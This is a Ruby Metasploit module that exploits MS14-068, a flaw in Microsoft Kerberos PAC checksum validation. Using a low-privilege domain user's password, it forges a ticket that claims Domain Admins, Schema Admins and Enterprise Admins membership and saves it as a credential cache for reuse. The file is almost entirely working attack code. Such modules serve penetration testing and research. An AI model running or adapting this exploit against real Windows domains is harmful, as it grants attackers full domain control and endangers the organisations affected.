##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit4 < Msf::Auxiliary

  include Msf::Kerberos::Client

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'MS14-068 Microsfot Kerberos Checksum Validation Vulnerability',
      'Description' => %q{
        This module exploits a vulnerability in the Microsoft Kerberos implementation. The problem
        exists in the verification of the Privilege Attribute Certificate (PAC) from a Kerberos TGS
        request, allowing a domain user to forge a PAC with arbitrary privileges, including Domain
        Administrator. This module outputs a MIT Kerberos Credential Cache with the privileged
        ticket, which can be imported, for example, on Mimikatz. It has been tested successfully on
        Windows 2008.
      },
      'Author' =>
        [
          'Tom Maddock', # Vulnerability discovery
          'Sylvain Monne', # pykek framework and exploit
          'juan vazquez' # Metasploit module
        ],
      'References' =>
        [
          ['CVE', '2014-6324'],
          ['MSB', 'MS14-068'],
          ['OSVDB', '114751'],
          ['URL', 'http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx'],
          ['URL', 'https://labs.mwrinfosecurity.com/blog/2014/12/16/digging-into-ms14-068-exploitation-and-defence/'],
          ['URL', 'https://github.com/bidord/pykek']
        ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Nov 18 2014'
    ))

    register_options(
      [
        OptString.new('USER', [ true, 'The Domain User', 'juan']),
        OptString.new('PASSWORD', [ true, 'The Domain User password', 'juan']),
        OptString.new('DOMAIN', [ true, 'The Domain Ex: DEMO.LOCAL', 'DEMO.LOCAL']),
        OptString.new('DOMAIN_SID', [ true, 'The Domain SID Ex: S-1-5-21-1755879683-3641577184-3486455962', 'S-1-5-21-1755879683-3641577184-3486455962'])
      ], self.class)
  end

  def run

    print_status("#{peer} - Connecting with the KDC...")
    connect(:rhost => datastore['RHOST'])

    unicode_password = Rex::Text.to_unicode(datastore['PASSWORD'])
    password_digest = OpenSSL::Digest.digest('MD4', unicode_password)

    pre_auth = []
    pre_auth << build_as_pa_time_stamp(key: password_digest)
    pre_auth << build_pa_pac_request
    pre_auth

    print_status("#{peer} - Sending AS-REQ...")
    res = send_request_as(
      client_name: "#{datastore['USER']}",
      server_name: "krbtgt/#{datastore['DOMAIN']}",
      realm: "#{datastore['DOMAIN']}",
      key: password_digest,
      pa_data: pre_auth
    )

    unless res.msg_type == Rex::Proto::Kerberos::Model::AS_REP
      print_error("#{peer} - Invalid AS-REP, aborting...")
      return
    end

    print_status("#{peer} - Parsing AS-REP...")

    session_key = extract_session_key(res, password_digest)
    logon_time = extract_logon_time(res, password_digest)
    ticket = res.ticket

    pre_auth = []
    pre_auth << build_pa_pac_request

    groups = [
      513, # DOMAIN_USERS
      512, # DOMAIN_ADMINS
      520, # GROUP_POLICY_CREATOR_OWNERS
      518, # SCHEMA_ADMINISTRATORS
      519  # ENTERPRISE_ADMINS
    ]

    pac = build_pac(
      client_name: datastore['USER'],
      group_ids: groups,
      domain_id: datastore['DOMAIN_SID'],
      realm: datastore['DOMAIN'],
      logon_time: logon_time,
    )

    auth_data = build_pac_authorization_data(pac: pac)

    print_status("#{peer} - Sending TGS-REQ...")

    res = send_request_tgs(
      client_name: datastore['USER'],
      server_name: "krbtgt/#{datastore['DOMAIN']}",
      realm: datastore['DOMAIN'],
      key: password_digest,
      logon_time: logon_time,
      session_key: session_key,
      ticket: ticket,
      group_ids: groups,
      domain_id: datastore['DOMAIN_SID'],
      auth_data: auth_data,
      pa_data: pre_auth
    )

    unless res.msg_type == Rex::Proto::Kerberos::Model::TGS_REP
      print_error("#{peer} - Invalid TGS-REP, aborting...")
      return
    end

    print_good("#{peer} - Valid TGS-Response, extracting credentials...")

    cache = extract_kerb_creds(res, 'AAAABBBBCCCCDDDD')

    pp cache

    f = File.new('/tmp/cache.ticket', 'wb')
    f.write(cache.encode)
    f.close
  end
end

